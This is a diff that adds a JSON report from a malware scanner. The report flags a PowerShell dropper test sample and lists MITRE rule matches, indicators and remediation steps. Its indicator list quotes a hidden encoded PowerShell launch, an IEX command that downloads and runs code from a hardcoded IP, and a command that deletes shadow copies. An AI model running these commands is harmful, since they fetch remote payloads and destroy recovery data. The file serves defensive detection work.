@@ -1,0 +1,81 @@
+{
+  "file_path": "C:\\Users\\hp\\Desktop\\Code-Analyzer\\python_orchestrator\\..\\samples\\malicious_script.ps1",
+  "file_size": 589,
+  "is_pe": false,
+  "is_elf": false,
+  "entropy": 5.357914263517367,
+  "is_packed": false,
+  "verdict": "MALICIOUS",
+  "confidence": 93.0,
+  "threat_score": 70,
+  "iocs": {
+    "urls": [
+      "http://185.220.101.5/stage2.bin')"
+    ],
+    "ip_addresses": [
+      "185.220.101.5"
+    ],
+    "onion_domains": [],
+    "suspicious_commands": [
+      "# CyberShield Test Suite - Obfuscated PowerShell Dropper Sample",
+      "# powershell.exe -w hidden -enc $encodedPayload",
+      "# IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage2.bin')",
+      "# vssadmin delete shadows /all /quiet"
+    ],
+    "suspicious_apis": [],
+    "registry_keys": [],
+    "ransomware_keywords": []
+  },
+  "rule_matches": [
+    {
+      "rule_name": "System_Recovery_Inhibition",
+      "category": "DEFENSE_EVASION",
+      "mitre": "T1490",
+      "severity": 4,
+      "description": "Detected destructive commands attempting to wipe Windows Volume Shadow Copies."
+    },
+    {
+      "rule_name": "Hardcoded_C2_Endpoints",
+      "category": "COMMAND_AND_CONTROL",
+      "mitre": "T1071",
+      "severity": 2,
+      "description": "Binary contains hardcoded remote URLs or Darknet .onion endpoints."
+    },
+    {
+      "rule_name": "Obfuscated_PowerShell_Execution",
+      "category": "EXECUTION",
+      "mitre": "T1059.001",
+      "severity": 3,
+      "description": "Detected suspicious in-memory encoded PowerShell execution commands."
+    }
+  ],
+  "analysis_duration_ms": 31.66,
+  "forensics": {
+    "summary": "HIGH-SEVERITY THREAT DETECTED. Sample matches known malware patterns including System_Recovery_Inhibition, Hardcoded_C2_Endpoints, Obfuscated_PowerShell_Execution. Detected capabilities include process injection and suspicious C2 communications.",
+    "attack_vectors": [
+      "DEFENSE_EVASION: Detected destructive commands attempting to wipe Windows Volume Shadow Copies.",
+      "COMMAND_AND_CONTROL: Binary contains hardcoded remote URLs or Darknet .onion endpoints.",
+      "EXECUTION: Detected suspicious in-memory encoded PowerShell execution commands."
+    ],
+    "mitre_matrix": [
+      {
+        "technique": "T1490",
+        "name": "System_Recovery_Inhibition"
+      },
+      {
+        "technique": "T1071",
+        "name": "Hardcoded_C2_Endpoints"
+      },
+      {
+        "technique": "T1059.001",
+        "name": "Obfuscated_PowerShell_Execution"
+      }
+    ],
+    "remediation_steps": [
+      "Quarantine or remove binary from host endpoint immediately.",
+      "Block identified network indicators (IPs/URLs) on perimeter firewalls.",
+      "Inspect running processes for suspicious remote threads and memory injections.",
+      "Audit Windows Registry persistence keys (Run / RunOnce / Services)."
+    ]
+  }
+}
